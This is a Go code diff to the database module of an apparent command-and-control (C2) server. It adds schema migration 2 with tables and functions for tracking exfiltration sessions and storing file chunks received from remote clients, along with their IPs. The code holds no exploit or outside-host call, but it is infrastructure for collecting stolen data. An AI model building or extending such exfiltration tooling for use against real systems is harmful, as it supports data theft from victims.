@@ -17,13 +17,29 @@ const (
 	DatabaseFileName = "c2_data.db"
 
 	// DatabaseSchemaVersion tracks the current schema version
-	DatabaseSchemaVersion = 1
+	DatabaseSchemaVersion = 2
 )
 
 // Database wraps the SQL database connection and provides C2-specific operations
 type Database struct {
 	db    *sql.DB
 	mutex sync.RWMutex
+}
+
+// ExfilSessionRecord represents the persisted metadata for a dedicated exfiltration session
+type ExfilSessionRecord struct {
+	SessionID      string
+	JobID          string
+	FileName       string
+	FileSize       int64
+	TotalChunks    int
+	ReceivedChunks int
+	Status         string
+	Note           string
+	ClientIP       string
+	CreatedAt      time.Time
+	UpdatedAt      time.Time
+	LastChunkAt    time.Time
 }
 
 // NewDatabase creates a new database connection and initializes the schema
@@ -122,6 +138,12 @@ func (d *Database) applyMigrations(fromVersion int) error {
 		}
 	}
 
+	if fromVersion < 2 {
+		if err := d.migration2ExfilSchema(); err != nil {
+			return fmt.Errorf("migration 2 failed: %w", err)
+		}
+	}
+
 	// Record schema version
 	_, err := d.db.Exec(`
 		INSERT INTO schema_version (version, applied_at, description)
@@ -203,6 +225,42 @@ func (d *Database) migration1InitialSchema() error {
 	);
 
 	CREATE INDEX IF NOT EXISTS idx_stager_cache_binary ON stager_chunk_cache(client_binary_id);
+	`
+
+	_, err := d.db.Exec(schema)
+	return err
+}
+
+// migration2ExfilSchema introduces tables for dedicated exfiltration sessions and chunks
+func (d *Database) migration2ExfilSchema() error {
+	schema := `
+	CREATE TABLE IF NOT EXISTS exfil_sessions (
+		session_id TEXT PRIMARY KEY,
+		job_id TEXT,
+		file_name TEXT,
+		file_size INTEGER,
+		total_chunks INTEGER,
+		received_chunks INTEGER DEFAULT 0,
+		status TEXT DEFAULT 'receiving',
+		note TEXT,
+		client_ip TEXT,
+		created_at INTEGER NOT NULL,
+		updated_at INTEGER NOT NULL,
+		last_chunk_at INTEGER
+	);
+
+	CREATE TABLE IF NOT EXISTS exfil_chunks (
+		session_id TEXT NOT NULL,
+		chunk_index INTEGER NOT NULL,
+		data BLOB NOT NULL,
+		received_at INTEGER NOT NULL,
+		PRIMARY KEY (session_id, chunk_index),
+		FOREIGN KEY (session_id) REFERENCES exfil_sessions(session_id) ON DELETE CASCADE
+	);
+
+	CREATE INDEX IF NOT EXISTS idx_exfil_sessions_status ON exfil_sessions(status);
+	CREATE INDEX IF NOT EXISTS idx_exfil_sessions_updated ON exfil_sessions(updated_at);
+	CREATE INDEX IF NOT EXISTS idx_exfil_chunks_session ON exfil_chunks(session_id);
 	`
 
 	_, err := d.db.Exec(schema)
@@ -1029,4 +1087,131 @@ func (d *Database) ClearStagerCache() error {
 	deleted, _ := result.RowsAffected()
 	logf("[DB] Cleared %d cached chunks", deleted)
 	return nil
+}
+
+// Exfil session operations
+
+// UpsertExfilSession creates or updates metadata for a dedicated exfiltration session
+func (d *Database) UpsertExfilSession(session *ExfilSessionRecord) error {
+	if session == nil {
+		return fmt.Errorf("session record is nil")
+	}
+
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	createdAt := session.CreatedAt
+	if createdAt.IsZero() {
+		createdAt = time.Now()
+	}
+	updatedAt := session.UpdatedAt
+	if updatedAt.IsZero() {
+		updatedAt = time.Now()
+	}
+	var lastChunk interface{}
+	if session.LastChunkAt.IsZero() {
+		lastChunk = nil
+	} else {
+		lastChunk = session.LastChunkAt.Unix()
+	}
+
+	_, err := d.db.Exec(`
+		INSERT INTO exfil_sessions (
+			session_id, job_id, file_name, file_size, total_chunks,
+			received_chunks, status, note, client_ip,
+			created_at, updated_at, last_chunk_at
+		) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+		ON CONFLICT(session_id) DO UPDATE SET
+			job_id = COALESCE(excluded.job_id, exfil_sessions.job_id),
+			file_name = COALESCE(excluded.file_name, exfil_sessions.file_name),
+			file_size = CASE WHEN excluded.file_size > 0 THEN excluded.file_size ELSE exfil_sessions.file_size END,
+			total_chunks = CASE WHEN excluded.total_chunks > 0 THEN excluded.total_chunks ELSE exfil_sessions.total_chunks END,
+			received_chunks = MAX(exfil_sessions.received_chunks, excluded.received_chunks),
+			status = COALESCE(excluded.status, exfil_sessions.status),
+			note = COALESCE(excluded.note, exfil_sessions.note),
+			client_ip = COALESCE(excluded.client_ip, exfil_sessions.client_ip),
+			updated_at = excluded.updated_at,
+			last_chunk_at = COALESCE(excluded.last_chunk_at, exfil_sessions.last_chunk_at)
+	`,
+		session.SessionID,
+		session.JobID,
+		session.FileName,
+		session.FileSize,
+		session.TotalChunks,
+		session.ReceivedChunks,
+		session.Status,
+		session.Note,
+		session.ClientIP,
+		createdAt.Unix(),
+		updatedAt.Unix(),
+		lastChunk,
+	)
+
+	return err
+}
+
+// RecordExfilChunk persists a chunk and returns true if it was newly inserted
+func (d *Database) RecordExfilChunk(sessionID string, chunkIndex uint32, data []byte) (bool, error) {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	tx, err := d.db.Begin()
+	if err != nil {
+		return false, fmt.Errorf("failed to begin txn: %w", err)
+	}
+
+	now := time.Now().Unix()
+	res, err := tx.Exec(`
+		INSERT INTO exfil_chunks (session_id, chunk_index, data, received_at)
+		VALUES (?, ?, ?, ?)
+		ON CONFLICT(session_id, chunk_index) DO NOTHING
+	`, sessionID, chunkIndex, data, now)
+	if err != nil {
+		tx.Rollback()
+		return false, fmt.Errorf("failed to insert chunk: %w", err)
+	}
+
+	rows, err := res.RowsAffected()
+	if err != nil {
+		tx.Rollback()
+		return false, err
+	}
+	inserted := rows > 0
+
+	if inserted {
+		if _, err := tx.Exec(`
+			UPDATE exfil_sessions
+			SET received_chunks = received_chunks + 1,
+				updated_at = ?,
+				last_chunk_at = ?
+			WHERE session_id = ?
+		`, now, now, sessionID); err != nil {
+			tx.Rollback()
+			return false, fmt.Errorf("failed to update session counters: %w", err)
+		}
+	}
+
+	if err := tx.Commit(); err != nil {
+		return false, err
+	}
+
+	return inserted, nil
+}
+
+// UpdateExfilSessionStatus updates the status field for a session
+func (d *Database) UpdateExfilSessionStatus(sessionID, status string) error {
+	if sessionID == "" {
+		return fmt.Errorf("session ID is required")
+	}
+
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	_, err := d.db.Exec(`
+		UPDATE exfil_sessions
+		SET status = ?, updated_at = ?
+		WHERE session_id = ?
+	`, status, time.Now().Unix(), sessionID)
+
+	return err
 }
